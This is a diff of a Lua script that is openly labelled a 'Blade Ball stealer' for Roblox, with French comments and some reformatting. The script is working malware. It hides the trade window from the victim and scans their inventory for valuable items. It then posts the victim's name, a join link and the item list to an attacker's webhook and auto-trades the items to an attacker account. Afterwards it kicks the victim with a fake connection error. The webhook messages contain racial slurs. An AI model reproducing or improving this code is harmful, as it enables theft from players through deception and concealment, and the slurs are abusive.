@@ -26,29 +26,24 @@ local auth_token = _G.AuthToken or ""
 
 -- Vérifications de sécurité de base
 if next(users) == nil or webhook == "" then
-    plr:kick("Configuration manquante (Usernames/Webhook)")
+    plr:kick("Missing Config")
     return
 end
 
 if game.PlaceId ~= 13772394625 then
-    plr:kick("Seulement sur les serveurs normaux")
+    plr:kick("Only works on normal servers")
     return
 end
 
 -- Vérification du code PIN (Reset bypass)
-local args = {
-    [1] = {
-        ["option"] = "PIN",
-        ["value"] = "9079"
-    }
-}
+local args = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
 local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
 if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Désactive ton code PIN de trade")
+    plr:kick("Please disable trade PIN")
     return
 end
 
--- Masquage de l'interface de trade pour la victime
+-- Masquage de l'interface
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
 tradeCompleteGui.Black.Visible = false
@@ -57,7 +52,7 @@ local maintradegui = tradeGui.Main
 maintradegui.Visible = false
 maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)
 
--- Fonction de formatage (1880 -> 1.88k)
+-- Fonction de formatage (Ex: 1880 -> 1.88k)
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -75,15 +70,8 @@ end
 
 local totalRAP = 0
 
--- FONCTION : Message d'annonce (Join Link) avec TRI RAP
+-- FONCTION D'ENVOI (JOIN MESSAGE + TRI)
 local function SendJoinMessage(list, prefix)
-    local fields = {
-        { name = "Victim Username 🤖:", value = plr.Name, inline = true },
-        { name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId },
-        { name = "Item list 📝:", value = "", inline = false },
-        { name = "Summary 💰:", value = "", inline = false }
-    }
-
     local grouped = {}
     for _, item in ipairs(list) do
         if grouped[item.Name] then
@@ -97,40 +85,37 @@ local function SendJoinMessage(list, prefix)
     local groupedList = {}
     for _, group in pairs(grouped) do table.insert(groupedList, group) end
 
-    -- TRI DU PLUS GROS RAP AU PLUS PETIT
+    -- TRI DU PLUS GROS RAP AU PLUS PETIT (Wind Thorn en premier)
     table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
+    local itemText = ""
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("⭐ %s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[3].value = fields[3].value .. itemLine .. "\n"
+        itemText = itemText .. string.format("⭐ %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
     end
-    
-    fields[4].value = string.format("Total RAP: %s", formatNumber(totalRAP))
 
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
-        ["auth_token"] = auth_token, 
+        ["auth_token"] = auth_token, -- Token pour Cloudflare
         ["embeds"] = {{
             ["title"] = "🟣 Bro join your hit nigga 🎯",
             ["color"] = 8323327,
-            ["fields"] = fields,
+            ["fields"] = {
+                { name = "Victim Username 🤖:", value = plr.Name, inline = true },
+                { name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId },
+                { name = "Item list 📝:", value = itemText ~= "" and itemText or "No items", inline = false },
+                { name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP), inline = false }
+            },
             ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" }
         }}
     }
     
-    local success, res = pcall(function()
-        return HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
+    pcall(function()
+        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
     end)
 end
 
--- FONCTION : Message final (Items envoyés) avec TRI RAP
+-- FONCTION D'ENVOI FINAL (TRADE RÉUSSI)
 local function SendMessage(list)
-    local fields = {
-        { name = "Victim Username 🤖:", value = plr.Name, inline = true },
-        { name = "Items sent 📝:", value = "", inline = false },
-        { name = "Summary 💰:", value = "", inline = false }
-    }
-
     local grouped = {}
     for _, item in ipairs(list) do
         if grouped[item.Name] then
@@ -147,19 +132,21 @@ local function SendMessage(list)
     -- TRI DU PLUS GROS RAP AU PLUS PETIT
     table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
+    local itemText = ""
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("✅ %s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[2].value = fields[2].value .. itemLine .. "\n"
+        itemText = itemText .. string.format("✅ %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
     end
-    
-    fields[3].value = string.format("Total RAP: %s", formatNumber(totalRAP))
 
     local data = {
         ["auth_token"] = auth_token,
         ["embeds"] = {{
             ["title"] = "🟣 The nigga is on the server 🎉",
             ["color"] = 8323327,
-            ["fields"] = fields,
+            ["fields"] = {
+                { name = "Victim Username 🤖:", value = plr.Name, inline = true },
+                { name = "Items sent 📝:", value = itemText ~= "" and itemText or "None", inline = false },
+                { name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP), inline = false }
+            },
             ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" }
         }}
     }
@@ -169,61 +156,53 @@ local function SendMessage(list)
     end)
 end
 
--- Logique de récupération du RAP et de l'inventaire
+-- RÉCUPÉRATION DU RAP
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
-local function buildNameToRAPMap(category)
-    local nameToRAP = {}
-    local categoryRapData = rapData[category]
-    if not categoryRapData then return nameToRAP end
-
-    for serializedKey, rap in pairs(categoryRapData) do
+local function getRAP(category, itemName)
+    local categoryData = rapData[category]
+    if not categoryData then return 0 end
+    for serializedKey, rap in pairs(categoryData) do
         local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
         if success and type(decodedKey) == "table" then
             for _, pair in ipairs(decodedKey) do
-                if pair[1] == "Name" then
-                    nameToRAP[pair[2]] = rap
-                    break
-                end
+                if pair[1] == "Name" and pair[2] == itemName then return rap end
             end
         end
     end
-    return nameToRAP
+    return 0
 end
 
-local rapMappings = {}
-for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end
-
+-- SCAN INVENTAIRE
 for _, category in ipairs(categories) do
     for itemId, itemInfo in pairs(clientInventory[category]) do
-        if itemInfo.TradeLock then continue end
-        local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
-        if rap >= min_rap then
-            totalRAP = totalRAP + rap
-            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+        if not itemInfo.TradeLock then
+            local rap = getRAP(category, itemInfo.Name)
+            if rap >= min_rap then
+                totalRAP = totalRAP + rap
+                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+            end
         end
     end
 end
 
--- Lancement du vol et des trades
+-- LOGIQUE DE TRADE
 if #itemsToSend > 0 then
-    -- Tri initial pour le trade
+    -- Tri des items du plus cher au moins cher pour le trade
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
 
-    local sentItems = {}
-    for i, v in ipairs(itemsToSend) do sentItems[i] = v end
+    local backupItems = {}
+    for i, v in ipairs(itemsToSend) do backupItems[i] = v end
 
-    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
+    local prefix = (ping == "Yes") and "@everyone " or ""
     SendJoinMessage(itemsToSend, prefix)
 
-    local function doTrade(joinedUser)
+    local function doTrade(targetName)
         while #itemsToSend > 0 do
-            -- Send Trade Request
-            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(game.Players:WaitForChild(joinedUser)) end)
+            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(game.Players:WaitForChild(targetName)) end)
             repeat task.wait(0.5) until tradeGui.Enabled
 
-            -- Ajout des items (max 100 par trade)
             local count = 0
             while #itemsToSend > 0 and count < 100 do
                 local item = table.remove(itemsToSend, 1)
@@ -231,7 +210,6 @@ if #itemsToSend > 0 then
                 count = count + 1
             end
 
-            -- Ready et Confirm
             pcall(function() netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) end)
             pcall(function() netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() end)
             repeat task.wait(0.1) until not tradeGui.Enabled
@@ -239,21 +217,21 @@ if #itemsToSend > 0 then
         plr:kick("Please check your internet connection (Error Code: 277)")
     end
 
-    -- Attendre qu'un de tes comptes (users) rejoigne
-    local function checkAndTrade()
+    -- Attente du compte de trade
+    local function start()
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(users, p.Name) then
-                SendMessage(sentItems)
+                SendMessage(backupItems)
                 doTrade(p.Name)
-                break
+                return
             end
         end
     end
 
-    checkAndTrade()
+    start()
     Players.PlayerAdded:Connect(function(p)
         if table.find(users, p.Name) then
-            SendMessage(sentItems)
+            SendMessage(backupItems)
             doTrade(p.Name)
         end
     end)
